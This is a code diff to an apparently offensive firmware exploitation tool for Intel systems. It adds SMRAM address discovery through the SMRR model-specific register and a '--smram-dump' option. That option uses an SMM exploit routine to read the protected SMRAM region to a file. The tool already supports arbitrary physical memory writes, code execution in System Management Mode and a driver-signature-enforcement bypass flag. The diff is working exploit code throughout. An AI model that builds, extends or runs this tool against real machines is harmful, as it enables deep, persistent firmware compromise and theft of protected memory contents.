@@ -21,6 +21,9 @@
 #define SMM_HANDLER_OP_PHYS_MEM_WRITE   2   // write physical memory from SMM
 #define SMM_HANDLER_OP_EXECUTE          3   // execute SMM code at specified physical address
 
+// default size for TSEG/HSEG
+#define SMRAM_SIZE 0x800000
+
 typedef void (* SMM_PROC)(void);
 
 typedef struct _SMM_HANDLER_CONTEXT
@@ -416,12 +419,30 @@ int exploit(PSMM_HANDLER_CONTEXT context, int target, const char *data_file)
     return ret;
 }
 //--------------------------------------------------------------------------------------
+unsigned long long smram_addr(void)
+{
+    unsigned long long ret = 0;
+
+    if (uefi_expl_msr_get(IA32_SMRR_PHYSBASE, &ret))
+    {
+        // get PhysBase field of IA32_SMRR_PHYSBASE, bits 12 through 31
+        ret &= 0xFFFFF000;
+    }
+    else
+    {
+        printf(__FUNCTION__"() ERROR: uefi_expl_msr_get() fails\n");
+    }
+
+    return ret;
+}
+//--------------------------------------------------------------------------------------
 int _tmain(int argc, _TCHAR* argv[])
 {
-    int ret = -1, target = -1;    
+    int ret = -1, target = -1;
+    unsigned int length = 0;
     SMM_HANDLER_CONTEXT context;
     const char *data_file = NULL;
-    bool use_dse_bypass = false, use_test = false;
+    bool use_dse_bypass = false, use_test = false, use_smram_dump = false;
 
     memset(&context, 0, sizeof(context));
     context.op = SMM_HANDLER_OP_NONE;
@@ -479,7 +500,7 @@ int _tmain(int argc, _TCHAR* argv[])
         else if (!strcmp(argv[i], "--length") && i < argc - 1)
         {
             // update read memory length value
-            context.phys_mem_read.size = strtoul(argv[i + 1], NULL, 16);
+            length = strtoul(argv[i + 1], NULL, 16);
 
             if (errno != 0)
             {
@@ -525,10 +546,23 @@ int _tmain(int argc, _TCHAR* argv[])
             // run libfwexpl tests
             use_test = true;
         }
+        else if (!strcmp(argv[i], "--smram-dump"))
+        {
+            // dump SMRAM contents
+            use_smram_dump = true;
+        }
+    }
+
+    if (use_smram_dump && data_file == NULL)
+    {
+        printf("ERROR: --smram-dump requires --file option to specify destination path\n");
+        return -1;
     }
 
     if (context.op == SMM_HANDLER_OP_PHYS_MEM_WRITE)
     {
+        context.phys_mem_write.size = length;
+
         if (data_file)
         {
 
@@ -562,12 +596,16 @@ int _tmain(int argc, _TCHAR* argv[])
         {
             printf("ERROR: --phys-mem-write reuires --file option\n");
         }
+    }   
+    else if (context.op == SMM_HANDLER_OP_PHYS_MEM_READ)
+    {
+        context.phys_mem_read.size = length;
     }
 
     // initialize HAL
     if (uefi_expl_init(NULL, use_dse_bypass))
     {    
-        unsigned long long val = 0;
+        unsigned long long val = 0;               
 
         if (use_test)
         {
@@ -584,8 +622,26 @@ int _tmain(int argc, _TCHAR* argv[])
             // check for Intel VID
             if (vid == 0x8086)
             {
-                // run exploitation
-                ret = exploit(&context, target, data_file);
+                // get current SMRAM address
+                unsigned long long addr = smram_addr();
+                if (addr)
+                {
+                    printf("SMRAM is at 0x%llx:0x%llx\n", addr, addr + SMRAM_SIZE - 1);
+
+                    if (use_smram_dump)
+                    {
+                        context.op = SMM_HANDLER_OP_PHYS_MEM_READ;
+                        context.phys_mem_read.size = length ? length : SMRAM_SIZE;
+                        context.phys_mem_read.addr = (void *)addr;
+                    }
+
+                    // run exploitation
+                    ret = exploit(&context, target, data_file);
+                }
+                else
+                {
+                    printf("ERROR: Unable to determinate SMRAM address\n");
+                }                
             }
             else
             {
@@ -596,7 +652,7 @@ int _tmain(int argc, _TCHAR* argv[])
         {
             printf("ERROR: uefi_expl_pci_read() fails\n");
         }
-
+_end:
         // uninitialize HAL
         uefi_expl_uninit();
     }
